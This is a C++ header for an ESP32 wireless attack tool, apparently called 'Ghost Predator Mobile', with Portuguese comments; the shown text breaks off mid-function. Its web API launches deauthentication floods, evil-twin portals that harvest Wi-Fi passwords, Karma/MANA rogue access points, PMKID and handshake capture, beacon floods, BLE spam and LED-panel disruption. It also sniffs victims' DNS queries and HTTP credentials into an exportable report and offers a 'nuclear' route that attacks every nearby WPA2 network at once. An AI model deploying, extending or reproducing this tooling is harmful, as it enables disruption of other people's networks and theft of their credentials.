#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <ArduinoJson.h>
#include <LittleFS.h>
#include "../config.h"
#include "../utils/logger.h"
#include "../wifi/scanner.h"
#include "../wifi/deauth.h"
#include "../wifi/evil_twin.h"
#include "../wifi/sniffer.h"
#include "../wifi/beacon_flood.h"
#include "../wifi/karma.h"
#include "../wifi/radio2.h"
#include "../bluetooth/ble_scanner.h"
#include "../bluetooth/bt_classic.h"
#include "../bluetooth/ble_spam.h"
#include "../wifi/pmkid_fisher.h"
#include "../wifi/wps_scanner.h"
#include "../wifi/target_intel.h"
#include "../wifi/hidden_scanner.h"
#include "../wifi/wifite_mode.h"
#include "../wifi/led_attack.h"

class WebServer {
public:
    static WebServer& get() { static WebServer inst; return inst; }

    AsyncWebServer server{80};
    AsyncWebSocket ws{"/ws"};
    bool authenticated = false;
    String currentPass = WEB_PASS;

    void begin() {
        _setupWiFiAP();
        _setupWebSocket();
        _setupRoutes();
        server.begin();
        LOG.success("Web server ativo → http://" + WiFi.softAPIP().toString());
    }

    void broadcastLog(const LogEntry& e) {
        if (ws.count() == 0) return;
        String json = "{\"t\":\"log\",\"lvl\":" + String(e.level) +
                      ",\"ts\":"  + String(e.ts) +
                      ",\"msg\":\"" + _esc(e.msg) + "\"}";
        ws.textAll(json);
    }

    void broadcastStatus() {
        if (ws.count() == 0) return;
        JsonDocument doc;
        _fillStatus(doc);
        String out; serializeJson(doc, out);
        String wrapped = "{\"t\":\"status\"," + out.substring(1);
        ws.textAll(wrapped);
    }

    void tick() {
        ws.cleanupClients();
        EvilTwin::get().tick();
        static unsigned long lastStatus = 0;
        if (millis() - lastStatus > 2000) {
            lastStatus = millis();
            broadcastStatus();
        }
    }

private:
    void _setupWiFiAP() {
        WiFi.mode(WIFI_AP_STA);
        WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL);
        delay(300);
        LOG.info("AP: " AP_SSID " -> " + WiFi.softAPIP().toString());
    }

    void _setupWebSocket() {
        ws.onEvent([](AsyncWebSocket* srv, AsyncWebSocketClient* c,
                      AwsEventType t, void*, uint8_t* data, size_t len) {
            if (t == WS_EVT_CONNECT)
                LOG.info("WS #" + String(c->id()) + " conectado");
            else if (t == WS_EVT_DISCONNECT)
                LOG.info("WS #" + String(c->id()) + " desconectado");
            else if (t == WS_EVT_DATA && len >= 4 &&
                     data[0]=='"' && data[1]=='p' && data[2]=='i' && data[3]=='n')
                c->text("{\"t\":\"pong\"}");
        });
        server.addHandler(&ws);
        LOG.onEntry([](const LogEntry& e) {
            WebServer::get().broadcastLog(e);
        });
    }

    void _fillStatus(JsonDocument& doc) {
        doc["heap"]        = ESP.getFreeHeap();
        doc["uptime"]      = millis() / 1000;
        doc["deauth"]      = Deauther::get().running;
        doc["sniffer"]     = Sniffer::get().running;
        doc["eviltwin"]    = EvilTwin::get().running;
        doc["beaconflood"] = BeaconFlood::get().running;
        doc["karma"]       = KarmaAttack::get().running;
        doc["ble"]         = BLEScanner::get().running;
        doc["radio2"]      = Radio2::get().available;
        doc["packets"]     = Sniffer::get().packetCount;
        doc["pkt_per_sec"] = Sniffer::get().pktPerSec;
        doc["mgmt"]        = Sniffer::get().mgmtCount;
        doc["data"]        = Sniffer::get().dataCount;
        doc["eapol"]       = Sniffer::get().eapolCount;
        doc["aps"]         = (int)WiFiScanner::get().aps().size();
        doc["clients"]     = (int)WiFiScanner::get().clients().size();
        doc["handshakes"]  = (int)Sniffer::get().handshakes.size();
        doc["pmkids"]      = (int)Sniffer::get().pmkids.size();
        doc["probes"]      = (int)Sniffer::get().probes.size();
        doc["bledevs"]     = (int)BLEScanner::get().devices.size();
        doc["creds"]       = (int)EvilTwin::get().captured.size();
        doc["karma_count"]    = (int)KarmaAttack::get().respondedTo.size();
        doc["karma_known"]    = (int)KarmaAttack::get().knownSSIDs.size();
        doc["channel"]        = Sniffer::get().hopChannel;
        doc["deauth_frames"]  = Deauther::get().framesSent;
        doc["pmkid_fisher"]   = PMKIDFisher::get().running;
        doc["fisher_attempts"]= PMKIDFisher::get().attempts;
        doc["fisher_captured"]= PMKIDFisher::get().captured;
        doc["wps_scan"]       = WPSScanner::get().running;
        doc["wps_count"]      = (int)WPSScanner::get().results.size();
        doc["wifite"]         = WifiteMode::get().running;
        doc["wifite_state"]   = (int)WifiteMode::get().state;
        doc["wifite_cur"]     = (int)WifiteMode::get().curIdx;
        doc["wifite_total"]   = (int)WifiteMode::get().targets.size();
        doc["ble_spam"]       = BLESpam::get().running;
        doc["ble_spam_pkts"]  = BLESpam::get().packetsSent;
        doc["intel_devs"]     = (int)TargetIntel::get().devices.size();
        doc["intel_dns"]      = (int)TargetIntel::get().dnsQueries.size();
        doc["intel_http"]     = (int)TargetIntel::get().httpCreds.size();
        doc["deauth_multi"]   = Deauther::get().multiMode;
        doc["hidden_scan"]    = HiddenScanner::get().running;
        doc["hidden_count"]   = (int)HiddenScanner::get().revealed.size();
        doc["hidden_targets"] = (int)HiddenScanner::get().targets.size();
    }

    void _setupRoutes() {
        server.serveStatic("/", LittleFS, "/").setDefaultFile("index.html");

        server.on("/api/status", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc;
            WebServer::get()._fillStatus(doc);
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });

        // ── WiFi ──────────────────────────────────────────────────────────────
        server.on("/api/wifi/scan", HTTP_GET, [](AsyncWebServerRequest* req) {
            WiFiScanner::get().scan();
            auto& aps = WiFiScanner::get().aps();
            JsonDocument doc;
            JsonArray arr = doc.to<JsonArray>();
            for (auto& ap : aps) {
                JsonObject o = arr.add<JsonObject>();
                o["ssid"]    = ap.ssid;
                o["bssid"]   = ap.bssidStr;
                o["rssi"]    = ap.rssi;
                o["channel"] = ap.channel;
                o["auth"]    = (int)ap.auth;
                o["hidden"]  = ap.hidden;
                o["clients"] = ap.clients;
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });

        server.on("/api/wifi/clients", HTTP_GET, [](AsyncWebServerRequest* req) {
            auto& cls = WiFiScanner::get().clients();
            JsonDocument doc;
            JsonArray arr = doc.to<JsonArray>();
            for (auto& c : cls) {
                JsonObject o = arr.add<JsonObject>();
                o["mac"]  = c.macStr; o["ap"] = c.apBssid;
                o["rssi"] = c.rssi;   o["seen"] = c.lastSeen;
                JsonArray probes = o["probes"].to<JsonArray>();
                for (auto& s : c.probedSSIDs) probes.add(s);
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });

        // ── System Info ───────────────────────────────────────────────────────
        server.on("/api/system/info", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc;
            doc["chip"]      = ESP.getChipModel();
            doc["cores"]     = ESP.getChipCores();
            doc["freq"]      = ESP.getCpuFreqMHz();
            doc["flash"]     = ESP.getFlashChipSize();
            doc["heap"]      = ESP.getFreeHeap();
            doc["heap_min"]  = ESP.getMinFreeHeap();
            doc["sketch"]    = ESP.getSketchSize();
            doc["free_sketch"] = ESP.getFreeSketchSpace();
            doc["mac_ap"]    = WiFi.softAPmacAddress();
            doc["mac_sta"]   = WiFi.macAddress();
            doc["ssid"]      = AP_SSID;
            doc["uptime"]    = millis();
            doc["sdk"]       = ESP.getSdkVersion();
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });

        // ── System Reboot ─────────────────────────────────────────────────────
        server.on("/api/system/reboot", HTTP_POST, [](AsyncWebServerRequest* req) {
            req->send(200, "application/json", "{\"ok\":true}");
            delay(200);
            ESP.restart();
        });

        // ── Stealth Mode ──────────────────────────────────────────────────────
        _postJson("/api/system/stealth", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            bool on = doc["on"] | false;
            if (on) {
                // Reduz TX power ao mínimo e para sniffer se ativo passivamente
                esp_wifi_set_max_tx_power(8);  // ~2dBm
                LOG.warn("[STEALTH] Modo stealth ativo — TX power reduzido");
            } else {
                esp_wifi_set_max_tx_power(78); // ~19.5dBm (default)
                LOG.info("[STEALTH] Modo stealth desativado — TX power restaurado");
            }
            req->send(200, "application/json", "{\"ok\":true}");
        });

        // ── Deauth ────────────────────────────────────────────────────────────
        _postJson("/api/deauth/start", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            String bssid  = doc["bssid"]       | "00:00:00:00:00:00";
            String client = doc["client"]      | "FF:FF:FF:FF:FF:FF";
            uint8_t ch    = doc["channel"]     | 6;
            bool autoC    = doc["autoCapture"] | false;
            uint8_t apMac[6], clMac[6];
            _parseMac(bssid.c_str(), apMac);
            _parseMac(client.c_str(), clMac);
            if (autoC) {
                Sniffer::get().lockChannel(ch);
                if (!Sniffer::get().running) Sniffer::get().start();
            }
            Deauther::get().start(apMac, clMac, ch, autoC);
            req->send(200, "application/json", "{\"ok\":true}");
        });

        server.on("/api/deauth/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            Deauther::get().stop();
            req->send(200, "application/json", "{\"ok\":true}");
        });

        _postJson("/api/deauth/intensity", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            uint8_t lvl = doc["level"] | 1;
            if (lvl > 2) lvl = 2;
            Deauther::get().intensity = lvl;
            const char* names[] = {"suave","normal","agressivo"};
            LOG.info("[DEAUTH] Intensidade: " + String(names[lvl]));
            req->send(200, "application/json", "{\"ok\":true}");
        });

        // ── Sniffer ───────────────────────────────────────────────────────────
        server.on("/api/sniffer/start", HTTP_POST, [](AsyncWebServerRequest* req) {
            Sniffer::get().start();
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/sniffer/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            Sniffer::get().stop();
            req->send(200, "application/json", "{\"ok\":true}");
        });
        _postJson("/api/sniffer/channel", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            Sniffer::get().lockChannel(doc["channel"] | 6);
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/sniffer/hop", HTTP_POST, [](AsyncWebServerRequest* req) {
            Sniffer::get().resumeHop();
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/sniffer/handshakes", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& h : Sniffer::get().handshakes) {
                JsonObject o = arr.add<JsonObject>();
                o["bssid"]=h.bssid; o["client"]=h.client;
                o["type"]=h.type;   o["len"]=h.len; o["ts"]=h.ts;
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });
        server.on("/api/sniffer/pmkids", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& p : Sniffer::get().pmkids) {
                JsonObject o = arr.add<JsonObject>();
                o["bssid"]=p.bssid; o["client"]=p.client;
                char hex[33]; for(int i=0;i<16;i++) sprintf(hex+i*2,"%02X",p.pmkid[i]);
                o["pmkid"]=hex; o["ts"]=p.ts;
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });
        server.on("/api/sniffer/probes", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& p : Sniffer::get().probes) {
                JsonObject o = arr.add<JsonObject>();
                o["mac"]=p.mac; o["ssid"]=p.ssid; o["rssi"]=p.rssi; o["ts"]=p.ts;
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });
        server.on("/api/sniffer/states", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& s : Sniffer::get().handshakeStates) {
                JsonObject o = arr.add<JsonObject>();
                o["bssid"]     = s.bssid;
                o["client"]    = s.client;
                o["m1"]        = s.m1; o["m2"] = s.m2;
                o["m3"]        = s.m3; o["m4"] = s.m4;
                o["crackable"] = s.crackable();
                o["complete"]  = s.complete();
                o["ts"]        = s.lastTs;
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });
        server.on("/api/sniffer/clear", HTTP_POST, [](AsyncWebServerRequest* req) {
            Sniffer::get().handshakes.clear();
            Sniffer::get().handshakeStates.clear();
            Sniffer::get().pmkids.clear();
            Sniffer::get().probes.clear();
            Sniffer::get().packetCount = 0;
            Sniffer::get().mgmtCount = 0;
            Sniffer::get().dataCount = 0;
            Sniffer::get().eapolCount = 0;
            req->send(200, "application/json", "{\"ok\":true}");
        });

        // ── Evil Twin ─────────────────────────────────────────────────────────
        _postJson("/api/eviltwin/start", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            EvilTwin::get().start(doc["ssid"] | "FreeWiFi", doc["channel"] | 6);
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/eviltwin/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            EvilTwin::get().stop();
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/eviltwin/creds", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& c : EvilTwin::get().captured) {
                JsonObject o = arr.add<JsonObject>();
                o["ssid"]=c.ssid; o["pass"]=c.password; o["ip"]=c.ip; o["ts"]=c.ts;
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });

        // ── Beacon Flood ──────────────────────────────────────────────────────
        _postJson("/api/beacon/start", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            BeaconFlood::get().clearSSIDs();
            if (doc["ssids"].is<JsonArray>())
                for (String s : doc["ssids"].as<JsonArray>())
                    BeaconFlood::get().addSSID(s);
            BeaconFlood::get().start(doc["channel"] | 6);
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/beacon/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            BeaconFlood::get().stop();
            req->send(200, "application/json", "{\"ok\":true}");
        });

        // ── Karma ─────────────────────────────────────────────────────────────
        server.on("/api/karma/start", HTTP_POST, [](AsyncWebServerRequest* req) {
            if (!Sniffer::get().running) Sniffer::get().start();
            KarmaAttack::get().start(false);
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/karma/mana", HTTP_POST, [](AsyncWebServerRequest* req) {
            if (!Sniffer::get().running) Sniffer::get().start();
            KarmaAttack::get().start(true);  // MANA: responde com todos SSIDs conhecidos
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/karma/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            KarmaAttack::get().stop();
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/karma/responded", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& s : KarmaAttack::get().respondedTo) arr.add(s);
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });

        // ── PMKID Fisher ─────────────────────────────────────────────────────
        _postJson("/api/fisher/start", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            PMKIDFisher::get().clearTargets();
            if (doc["targets"].is<JsonArray>()) {
                for (JsonObject t : doc["targets"].as<JsonArray>()) {
                    String bssid = t["bssid"] | "00:00:00:00:00:00";
                    String ssid  = t["ssid"]  | "";
                    uint8_t ch   = t["channel"] | 6;
                    uint8_t mac[6];
                    _parseMac(bssid.c_str(), mac);
                    PMKIDFisher::get().addTarget(mac, ssid.c_str(), ch);
                }
            }
            PMKIDFisher::get().start();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/fisher/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            PMKIDFisher::get().stop();
            req->send(200,"application/json","{\"ok\":true}");
        });

        // ── WPS Scanner ───────────────────────────────────────────────────────
        server.on("/api/wps/start", HTTP_POST, [](AsyncWebServerRequest* req) {
            WPSScanner::get().start();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/wps/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            WPSScanner::get().stop();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/wps/results", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& r : WPSScanner::get().results) {
                JsonObject o = arr.add<JsonObject>();
                o["bssid"]=r.bssid; o["ssid"]=r.ssid; o["channel"]=r.channel;
                o["version"]=r.version; o["methods"]=r.configMethods;
                o["locked"]=r.locked; o["pin"]=r.pinEnabled;
                o["pbc"]=r.pushButton; o["rssi"]=r.rssi;
            }
            String out; serializeJson(doc,out);
            req->send(200,"application/json",out);
        });

        // ── BLE Spam ──────────────────────────────────────────────────────────
        _postJson("/api/blespam/start", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            int m = doc["mode"] | 0;
            BLESpam::get().start((BLESpam::Mode)m);
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/blespam/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            BLESpam::get().stop();
            req->send(200,"application/json","{\"ok\":true}");
        });

        // ── Target Intelligence ───────────────────────────────────────────────
        server.on("/api/intel/start", HTTP_POST, [](AsyncWebServerRequest* req) {
            TargetIntel::get().start();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/intel/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            TargetIntel::get().stop();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/intel/devices", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& d : TargetIntel::get().devices) {
                JsonObject o = arr.add<JsonObject>();
                o["mac"]=d.mac; o["mfr"]=d.manufacturer;
                o["type"]=d.deviceType; o["rssi"]=d.rssi;
                o["first"]=d.firstSeen; o["last"]=d.lastSeen;
                JsonArray ss = o["ssids"].to<JsonArray>();
                for (auto& s : d.probedSSIDs) ss.add(s);
            }
            String out; serializeJson(doc,out);
            req->send(200,"application/json",out);
        });
        server.on("/api/intel/dns", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& d : TargetIntel::get().dnsQueries) {
                JsonObject o = arr.add<JsonObject>();
                o["mac"]=d.clientMac; o["domain"]=d.domain; o["ts"]=d.ts;
            }
            String out; serializeJson(doc,out);
            req->send(200,"application/json",out);
        });
        server.on("/api/intel/http", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& h : TargetIntel::get().httpCreds) {
                JsonObject o = arr.add<JsonObject>();
                o["mac"]=h.clientMac; o["host"]=h.host;
                o["path"]=h.path; o["body"]=h.body; o["ts"]=h.ts;
            }
            String out; serializeJson(doc,out);
            req->send(200,"application/json",out);
        });
        server.on("/api/intel/clear", HTTP_POST, [](AsyncWebServerRequest* req) {
            TargetIntel::get().devices.clear();
            TargetIntel::get().dnsQueries.clear();
            TargetIntel::get().httpCreds.clear();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/export/intel", HTTP_GET, [](AsyncWebServerRequest* req) {
            String out = "# Ghost Predator Mobile — Target Intelligence Report\n";
            out += "# Gerado: " + String(millis()/1000) + "s uptime\n\n";
            out += "## DISPOSITIVOS (" + String(TargetIntel::get().devices.size()) + ")\n";
            for (auto& d : TargetIntel::get().devices)
                out += d.mac + " | " + d.manufacturer + " | " + d.deviceType + "\n";
            out += "\n## CONSULTAS DNS (" + String(TargetIntel::get().dnsQueries.size()) + ")\n";
            for (auto& q : TargetIntel::get().dnsQueries)
                out += q.clientMac + " -> " + q.domain + "\n";
            out += "\n## CREDENCIAIS HTTP (" + String(TargetIntel::get().httpCreds.size()) + ")\n";
            for (auto& h : TargetIntel::get().httpCreds)
                out += h.clientMac + " POST " + h.host + h.path + "\n" + h.body + "\n";
            req->send(200,"text/plain",out);
        });

        // ── Multi-target Deauth ───────────────────────────────────────────────
        _postJson("/api/deauth/multi", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            Deauther::get().stop();
            if (doc["targets"].is<JsonArray>()) {
                for (JsonObject t : doc["targets"].as<JsonArray>()) {
                    String bssid  = t["bssid"]  | "00:00:00:00:00:00";
                    String client = t["client"] | "FF:FF:FF:FF:FF:FF";
                    uint8_t ch    = t["channel"] | 6;
                    uint8_t apMac[6], clMac[6];
                    _parseMac(bssid.c_str(), apMac);
                    _parseMac(client.c_str(), clMac);
                    if (_isSelfMac(apMac)) continue; // nunca atacar a si mesmo
                    Deauther::get().addMultiTarget(apMac, clMac, ch);
                }
            }
            Deauther::get().startMulti(Deauther::get().multiTargets);
            req->send(200,"application/json","{\"ok\":true}");
        });

        // ── Hidden SSID Scanner ───────────────────────────────────────────────
        server.on("/api/hidden/load", HTTP_POST, [](AsyncWebServerRequest* req) {
            HiddenScanner::get().loadFromScan();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/hidden/start", HTTP_POST, [](AsyncWebServerRequest* req) {
            HiddenScanner::get().start();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/hidden/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            HiddenScanner::get().stop();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/hidden/results", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& t : HiddenScanner::get().targets) {
                JsonObject o = arr.add<JsonObject>();
                o["bssid"]=t.bssid; o["ssid"]=t.ssid;
                o["channel"]=t.channel; o["rssi"]=t.rssi;
            }
            for (auto& r : HiddenScanner::get().revealed) {
                bool found = false;
                for (auto& t : HiddenScanner::get().targets)
                    if (t.ssid == r) { found = true; break; }
                if (!found) { JsonObject o = arr.add<JsonObject>(); o["ssid"]=r; o["bssid"]="?"; }
            }
            String out; serializeJson(doc,out);
            req->send(200,"application/json",out);
        });

        // ── WifiteMode ────────────────────────────────────────────────────────
        server.on("/api/wifite/start", HTTP_POST, [](AsyncWebServerRequest* req) {
            WifiteMode::get().start();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/wifite/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            WifiteMode::get().stop();
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/wifite/status", HTTP_GET, [](AsyncWebServerRequest* req) {
            req->send(200,"application/json", WifiteMode::get().statusJson());
        });
        _postJson("/api/wifite/config", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            auto& w = WifiteMode::get();
            if (!doc["minRSSI"].isNull())       w.minRSSI        = doc["minRSSI"] | 70;
            if (!doc["pmkidTimeout"].isNull())  w.pmkidTimeoutMs = (doc["pmkidTimeout"] | 30) * 1000;
            if (!doc["deauthTimeout"].isNull()) w.deauthTimeoutMs= (doc["deauthTimeout"] | 60) * 1000;
            if (!doc["skipWeak"].isNull())      w.skipWeak       = doc["skipWeak"] | true;
            req->send(200,"application/json","{\"ok\":true}");
        });

        // ── LED Panel Attack ─────────────────────────────────────────────────
        server.on("/api/led/scan", HTTP_POST, [](AsyncWebServerRequest* req) {
            LEDAttack::get().scan();
            req->send(200,"application/json", LEDAttack::get().statusJson());
        });
        server.on("/api/led/status", HTTP_GET, [](AsyncWebServerRequest* req) {
            req->send(200,"application/json", LEDAttack::get().statusJson());
        });
        _postJson("/api/led/deauth", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            int idx = doc["idx"] | 0;
            LEDAttack::get().startDeauth(idx);
            req->send(200,"application/json","{\"ok\":true}");
        });
        _postJson("/api/led/flood", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            int idx = doc["idx"] | 0;
            LEDAttack::get().startFlood(idx);
            req->send(200,"application/json","{\"ok\":true}");
        });
        _postJson("/api/led/disrupt", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            int idx = doc["idx"] | 0;
            LEDAttack::get().startDisrupt(idx);
            req->send(200,"application/json","{\"ok\":true}");
        });
        server.on("/api/led/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            LEDAttack::get().stop();
            req->send(200,"application/json","{\"ok\":true}");
        });

        // ── Nuclear Auto-Attack ───────────────────────────────────────────────
        server.on("/api/nuclear/start", HTTP_POST, [](AsyncWebServerRequest* req) {
            auto& aps = WiFiScanner::get().aps();
            if (aps.empty()) {
                req->send(400,"application/json","{\"ok\":false,\"error\":\"Faça um scan WiFi primeiro\"}");
                return;
            }
            // 1. Para qualquer ataque em andamento
            Deauther::get().stop();
            PMKIDFisher::get().stop();
            Sniffer::get().stop();
            // 2. Inicia sniffer para capturar handshakes
            Sniffer::get().start();
            // 3. Deauth multi-alvo em todos os WPA2 APs
            std::vector<Deauther::Target> dTargets;
            for (auto& ap : aps) {
                if ((int)ap.auth >= 3) { // WPA2
                    uint8_t mac[6]; _parseMac(ap.bssidStr.c_str(), mac);
                    if (_isSelfMac(mac)) {
                        LOG.info("[NUCLEAR] Ignorando próprio MAC: " + ap.bssidStr);
                        continue;
                    }
                    Deauther::Target t;
                    memcpy(t.ap, mac, 6);
                    memset(t.client, 0xFF, 6);
                    t.channel = ap.channel;
                    dTargets.push_back(t);
                    // 4. Adiciona ao Fisher (com RSSI real para delay adaptativo)
                    PMKIDFisher::get().addTarget(mac, ap.ssid.c_str(), ap.channel, (int8_t)ap.rssi);
                }
            }
            if (!dTargets.empty()) Deauther::get().startMulti(dTargets);
            // 5. PMKID Fisher nos mesmos alvos
            if (!PMKIDFisher::get().targets.empty()) PMKIDFisher::get().start();
            // 6. Karma para apanhar clientes desconectados
            if (!Sniffer::get().running) Sniffer::get().start();
            KarmaAttack::get().start();
            LOG.warn("[NUCLEAR] Cadeia iniciada: " + String(dTargets.size()) + " alvos WPA2");
            req->send(200,"application/json","{\"ok\":true,\"targets\":" + String(dTargets.size()) + "}");
        });

        server.on("/api/nuclear/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
            Deauther::get().stop();
            PMKIDFisher::get().stop();
            KarmaAttack::get().stop();
            Sniffer::get().stop();
            LOG.info("[NUCLEAR] Cadeia parada");
            req->send(200,"application/json","{\"ok\":true}");
        });

        // ── Reboot ────────────────────────────────────────────────────────────
        server.on("/api/reboot", HTTP_POST, [](AsyncWebServerRequest* req) {
            req->send(200,"application/json","{\"ok\":true,\"msg\":\"Reiniciando...\"}");
            LOG.warn("[SYS] Reinicializando o ESP32...");
            delay(500);
            esp_restart();
        });

        // ── Portal Template ───────────────────────────────────────────────────
        _postJson("/api/eviltwin/template", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            WebServer::get()._portalTemplate = doc["template"] | 0;
            req->send(200,"application/json","{\"ok\":true}");
        });

        // ── BLE ───────────────────────────────────────────────────────────────
        _postJson("/api/ble/scan", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            int secs = doc["seconds"] | 5;
            BLEScanner::get().startScan(secs);
            unsigned long t = millis();
            while (BLEScanner::get().running && millis()-t < (uint32_t)(secs+3)*1000)
                delay(100);
            JsonDocument out; JsonArray arr = out.to<JsonArray>();
            for (auto& d : BLEScanner::get().devices) {
                JsonObject o = arr.add<JsonObject>();
                o["addr"]=d.address; o["name"]=d.name;
                o["rssi"]=d.rssi;    o["conn"]=d.connectable;
                o["svc"]=d.serviceUUIDs; o["mfr"]=d.manufacturerData;
            }
            String s; serializeJson(out, s);
            req->send(200, "application/json", s);
        });
        _postJson("/api/ble/enumerate", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            req->send(200, "application/json", BLEScanner::get().enumerate(doc["addr"] | ""));
        });

        // ── BT Classic ────────────────────────────────────────────────────────
        _postJson("/api/btclassic/scan", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            BTClassic::get().startInquiry(doc["duration"] | 10);
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/btclassic/devices", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& d : BTClassic::get().devices) {
                JsonObject o = arr.add<JsonObject>();
                o["mac"]=d.mac; o["name"]=d.name; o["cod"]=d.cod; o["rssi"]=d.rssi;
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });
        _postJson("/api/btclassic/setname", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            BTClassic::get().setName(doc["name"] | "iPhone");
            req->send(200, "application/json", "{\"ok\":true}");
        });

        // ── Radio2 ────────────────────────────────────────────────────────────
        server.on("/api/radio2/status", HTTP_GET, [](AsyncWebServerRequest* req) {
            req->send(200,"application/json", Radio2::get().available?"{\"ok\":true}":"{\"ok\":false}");
        });
        server.on("/api/radio2/scan", HTTP_GET, [](AsyncWebServerRequest* req) {
            req->send(200, "text/plain", Radio2::get().scanNetworks());
        });

        // ── Auth ──────────────────────────────────────────────────────────────
        _postJson("/api/login", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            String pass = doc["password"] | "";
            if (pass == WebServer::get().currentPass) {
                WebServer::get().authenticated = true;
                LOG.info("[AUTH] Login bem-sucedido");
                req->send(200, "application/json", "{\"ok\":true}");
            } else {
                LOG.warn("[AUTH] Tentativa de login com senha incorreta");
                req->send(401, "application/json", "{\"ok\":false,\"error\":\"Senha incorreta\"}");
            }
        });
        server.on("/api/logout", HTTP_POST, [](AsyncWebServerRequest* req) {
            WebServer::get().authenticated = false;
            req->send(200, "application/json", "{\"ok\":true}");
        });
        server.on("/api/auth/check", HTTP_GET, [](AsyncWebServerRequest* req) {
            req->send(200,"application/json",
                WebServer::get().authenticated ? "{\"ok\":true}" : "{\"ok\":false}");
        });
        _postJson("/api/change-password", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            if (!WebServer::get().authenticated) {
                req->send(403, "application/json", "{\"ok\":false,\"error\":\"Nao autenticado\"}");
                return;
            }
            String cur = doc["current"] | "";
